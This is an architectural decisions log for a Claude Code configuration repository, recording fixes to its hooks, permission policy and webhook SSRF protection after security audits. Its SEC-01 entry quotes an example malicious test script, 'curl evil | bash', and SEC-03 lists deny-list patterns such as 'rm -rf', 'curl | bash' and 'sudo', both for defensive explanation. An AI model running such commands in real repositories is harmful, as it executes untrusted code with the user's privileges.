# Architectural Decisions — Claude Code Config

> **Canonical decisions file (restored 2026-07-16).** This is the path `post_commit_memory.py`'s
> `find_decisions_file()` and `session_start.py` actually resolve — before this file existed,
> commits with an `arch:`/`decision:`/`security:`/`pattern:` prefix were silently dropped
> ("Decision detected but no decisions.md found"), and `session_start.py`'s decisions-context
> print was always empty. Content below through the "---" divider is migrated verbatim from
> the legacy `memory/decisions.md` (repo root) so no history is lost. New decisions append below.
> See `docs/memory-architecture.md` for the full memory-system map.

## Format
### [DATE] Decision Name
- **Problem:** what needed solving
- **Decision:** what was chosen
- **Rationale:** why this approach
- **Status:** active / superseded / revisited

---

### [2026-04-04] Fix regex replacement in webhook_notify.py
- **Problem:** `_SECRET_PATTERN.sub(r"\1=[REDACTED]", summary)` raised `PatternError`
  on Python 3.13 — all alternations used non-capturing `(?:...)`, so `\1` was invalid.
- **Decision:** Changed to `_SECRET_PATTERN.sub("[REDACTED]", summary)` — replace full match.
- **Rationale:** Simpler and correct. The capture group was never needed; we want to replace
  the entire secret match, not a sub-group of it.
- **Status:** active

### [2026-04-04] Coverage gate: 38% → 45%, target next: 60%
- **Problem:** CI gated at 38% — honest but too low for "production-grade" claim.
- **Decision:** Added 168 tests across 5 zero-coverage hooks. Gate raised to 45%.
- **Rationale:** Risk-weighted approach — covered keyword_router, permission_policy,
  evidence_guard, security_verify, webhook_notify first (all HIGH-RISK, all were 0%).
- **Status:** active — next step: scripts/ coverage (doctor.py, weekly_review.py)

### [2026-04-04] Eval job: workflow_dispatch + schedule, continue-on-error
- **Problem:** Eval corpus existed (6 TCs) but was never run in CI — manual only.
- **Decision:** Added `eval` CI job triggered by `workflow_dispatch` and weekly cron
  (Monday 06:00 UTC). `continue-on-error: true` — eval is informational, not a gate.
- **Rationale:** LLM responses are non-deterministic and API calls cost money. Running
  on every push would waste budget and create flaky CI. Weekly + manual is the right cadence.
- **Status:** active

### [2026-03-31] v3.2.0: 5 new hook events (TaskCreated, TaskCompleted, InstructionsLoaded, Elicitation, ElicitationResult)
- **Problem:** TaskCreated/Completed events not hooked — no visibility into agent task lifecycle.
- **Decision:** Added task_audit.py, instructions_audit.py, elicitation_guard.py, subagent_verify.py.
- **Rationale:** Full 25/25 hook event coverage. Observability layer for agent quality.
- **Status:** active

### [2026-03-31] 4 agents restored from _archived/ (security-guard, scope-guard, fe-mentor, skill-suggester)
- **Problem:** Agent count dropped to 9 after cleanup — useful agents were archived too aggressively.
- **Decision:** Restored all 4 with `effort` field and `permissionMode: acceptEdits` for builder/tester.
- **Rationale:** All 4 serve distinct purposes with no overlap. Archiving them reduced coverage.
- **Status:** active — 13 agents + 3 teams

### [2026-03-30] v3.0.0: Split monolithic CLAUDE.md → modular 6-layer architecture
- **Problem:** Single CLAUDE.md grew to 3000+ tokens, loaded on every message.
- **Decision:** Layer 1 (CLAUDE.md, 500 tok, always) + Layer 2 (rules, 0 tok, on-demand)
  + Layer 3 (skills, triggered) + Layer 4 (agents, isolated) + Layer 5 (hooks, 0 tok runtime)
  + Layer 6 (MCP profiles, switchable).
- **Rationale:** Token economy: ~500 tokens/message vs 3000+. Hooks enforce policy
  deterministically without consuming context window.
- **Status:** active — core architecture

### [2026-03-30] Hooks enforce policy, not instructions
- **Problem:** CLAUDE.md documented Evidence Policy, TDD, PII rules — but nothing enforced them.
  Claude could ignore any instruction.
- **Decision:** Move enforcement to Python hooks (PreToolUse, PostToolUse, UserPromptSubmit).
  Hooks run 100% of the time, cannot be skipped by the model.
- **Rationale:** `[VERIFIED] vs [INFERRED]` distinction: hook execution is deterministic,
  prompt instructions are probabilistic. Hard guards belong in hooks.
- **Status:** active

### [2026-03-30] permission_policy: dangerous patterns checked BEFORE chain operators
- **Problem:** Design question — which check has priority: dangerous pattern or chain operator?
- **Decision:** Check DANGEROUS_PATTERNS first, CHAIN_OPERATORS second, SAFE_PREFIXES third.
- **Rationale:** A command with a dangerous pattern (`rm -rf`) is always denied regardless of
  chain operators. Chain operators only escalate to "ask" when no dangerous pattern is found.
  Deny > Ask > Allow is the correct security ordering.
- **Status:** active — verified by test_permission_policy.py::TestDecidePriority

### [2026-03-30] MCP CircuitBreaker: CLOSED/OPEN/HALF_OPEN with 60s recovery
- **Problem:** MCP server failures caused session hangs — no automatic recovery.
- **Decision:** CircuitBreaker with state machine: CLOSED (normal) → OPEN (3 failures) →
  HALF_OPEN (probe after 60s) → CLOSED (probe succeeds) or OPEN (probe fails).
- **Rationale:** Standard resilience pattern. 60s recovery window prevents thundering herd.
  mcp_circuit_breaker.py at 98% coverage — highest-coverage hook.
- **Status:** active

### [2026-07-16] Restored canonical `.claude/memory/decisions.md` (this file)
- **Problem:** External architectural audit + internal Codex audit both flagged that
  `find_decisions_file()` (post_commit_memory.py) and `session_start.py` resolve
  `.claude/memory/decisions.md`, which never existed — only the legacy `memory/decisions.md`
  (repo root) had real content, but nothing reads it. Result: every `arch:`/`decision:`/
  `security:`/`pattern:` commit since this drifted apart silently dropped its decision entry.
- **Decision:** Migrated the full historical content from `memory/decisions.md` into this file
  verbatim (everything above this entry) and added a DEPRECATED banner to the legacy file
  pointing here, matching the precedent already set for `activeContext.md`'s same split.
  Legacy file kept, not deleted — `find_file_upward` resolution for other callers wasn't
  independently re-audited in this pass.
- **Rationale:** Minimal, safe fix matching `docs/memory-architecture.md`'s own stated target
  ("one canonical memory root") without doing the riskier full retirement of `memory/` in the
  same pass. Restores the write and read path both hooks already expected.
- **Status:** active

### [2026-07-17] SEC-01: removed pytest/npm test/npm run test/npm run lint from auto-allow
- **Problem:** External security audit found `hooks/permission_policy.py`'s `SAFE_BASH_PREFIXES`
  auto-approved `pytest`, `python -m pytest`, `npm test`, `npm run test`, `npm run lint` via
  `cmd_lower.startswith(prefix)`. Unlike the other safe prefixes (git introspection, ruff, mypy —
  none of which execute repository-authored code), these commands EXECUTE it: pytest imports
  `conftest.py`/fixtures/plugins from the working tree before running a single test; `npm test`/
  `npm run <script>` runs whatever arbitrary shell command `package.json`'s `scripts` section
  defines. A malicious `conftest.py` or a `"test": "curl evil | bash"` package.json script would
  execute with the user's privileges, with zero confirmation, the moment an agent ran "the tests"
  in an untrusted repository. The prefix match also collided on lookalike executable names
  (`pytest-malicious` starts with "pytest"). An existing test (`test_pytest_allowed`) explicitly
  asserted the old behavior as correct — this was a deliberate design choice (fewer prompts), not
  an oversight, but the threat-model gap for untrusted repos was real.
- **Decision:** Removed all 5 from `SAFE_BASH_PREFIXES`; they now require explicit "ask" like any
  other command. `ruff`/`mypy` remain auto-allowed (pure static analysis, no code execution).
  Did NOT implement the audit's full remediation roadmap (sandboxed test-runner profile,
  capability-scoped approval, exact-argv parsing) — that is a much larger engineering project;
  this fix closes the specific auto-allow bypass, not the general "should test runners ever be
  safe to auto-run" question.
- **Rationale:** The security cost (arbitrary code execution in untrusted repos, zero
  confirmation) outweighs the convenience benefit (fewer prompts) for a config whose whole
  premise is evidence-based trust, not convenience-first defaults. Matches the same precedent
  already set for `cat`/`head`/`tail`/`wc` reading sensitive paths (security audit 2026-07-07/
  07-12) — narrow the auto-allow surface to genuinely side-effect-free operations only.
- **Status:** active

### [2026-07-17] SEC-02: webhook DNS check fail-closed + pinned against rebinding TOCTOU
- **Problem:** External security audit found two related gaps in `hooks/webhook_notify.py`'s
  SSRF protection: (1) `_resolves_to_blocked_ip` returned `False` (not blocked) when
  `socket.getaddrinfo` raised `OSError`, treating "can't tell if it's safe" as "it's safe" —
  the wrong default specifically for an SSRF check; (2) the hostname was resolved ONCE at
  validation time (`get_webhook_url()`) but `urlopen()` then re-resolved the SAME hostname
  independently at connect time — a DNS-rebinding attacker could return a safe public IP for
  the validation check and a private/metadata IP for the real connection moments later.
- **Decision:** Replaced `_resolves_to_blocked_ip(hostname) -> bool` with
  `_resolve_safe_ip(hostname) -> str | None`, which fails CLOSED on resolution failure and
  returns the validated IP itself (not just a bool) so callers can pin the connection to
  it. `send_webhook()` now resolves the hostname once, immediately before connecting, and
  monkeypatches `socket.getaddrinfo` (scoped by try/finally, restored before the function
  returns) so any DNS lookup for that exact hostname during the connection returns the
  already-validated IP — closing the window between check and connect. `_ValidatingRedirectHandler`
  extends the same pinning to redirect targets via a shared `pins` dict.
- **Rationale:** Fail-closed is safe here specifically because `send_webhook` already treats
  every failure as a normal, silent outcome (fire-and-forget, all exceptions swallowed) — the
  cost of refusing to resolve is one missed Slack ping, not a broken workflow, unlike
  `input_guard.py`/`permission_policy.py` where fail-closed on the wrong thing would block a
  legitimate tool call. Chose a monkeypatched `getaddrinfo` pin over hand-rolled
  `http.client.HTTPConnection`/`HTTPSConnection` subclasses — same TOCTOU-closing effect,
  far less code, and TLS/SNI/certificate-hostname verification keeps working unmodified since
  only the low-level address resolution is intercepted, not the Host header or SNI hostname.
- **Status:** active

### [2026-07-18] SEC-03: permission_policy.py was wired to a hook event that never fires
- **Problem:** `hooks/permission_policy.py` was registered under the `PermissionRequest` event.
  Per Claude Code's own docs (verified via WebFetch against code.claude.com/docs/en/hooks and
  /en/permissions, not assumed), `PermissionRequest` fires only "when a permission dialog
  appears". `hooks/settings.json` has `"Bash(*)"` unconditionally in `permissions.allow` — a
  static rule that auto-approves every Bash command with no dialog ever shown. Since no dialog
  ever appears for Bash in this repo's own config, `PermissionRequest` never fired for a single
  Bash command, meaning the entire `decide()` logic — the SEC-01 pytest/npm-test "ask" fix
  *and* the whole `DANGEROUS_PATTERNS` deny list (`rm -rf`, `curl | bash`, `sudo`, `DROP TABLE`,
  `git push --force`, etc.) and the sensitive-path-read guard — was dead code for as long as
  `Bash(*)` has been in the allow list. Found while independently re-verifying two conflicting
  sub-agent claims about permission precedence (per `audit-verification-gate.md`: an agent's
  `[VERIFIED]` is only my `[INFERRED]` until checked directly) — neither agent's paraphrase was
  trusted; the docs were fetched and read verbatim before concluding anything.
- **Decision:** Moved the hook from `PermissionRequest` to `PreToolUse`/matcher `"Bash"` — the
  event the docs themselves name as the correct pattern ("add `Bash` to your allow list and
  register a PreToolUse hook that rejects those specific commands"). `main()` now emits
  `hookSpecificOutput.permissionDecision` via `utils.emit_permission_decision()` instead of a
  hand-built `PermissionRequest`/`decision.behavior` payload. Added `hook_main(fail_closed=True)`,
  matching the treatment already given to other deny-capable hooks (`input_guard.py`,
  `pre_commit_guard.py`) — this hook was previously called bare, with no timeout/crash
  protection at all. Synced `hooks/registry.yaml` metadata (`event`/`matcher`), removed
  `scripts/config_audit_scan.py`'s now-stale check that flagged the *absence* of a
  `PermissionRequest` registration as a safety gap (its presence there was the actual problem),
  and corrected two README claims ("~75% fewer prompts" via the dead mechanism) to describe
  what the hook actually does now.
- **Rationale:** `decide()`'s logic itself was never in question — only its wiring. `PreToolUse`
  fires unconditionally on every tool call, before permission rules are evaluated, and can
  override a matching allow rule via `permissionDecision`/exit-code-2, which is exactly the
  override capability this hook's threat model requires and `PermissionRequest` structurally
  cannot provide once a blanket allow rule exists.
- **Status:** active
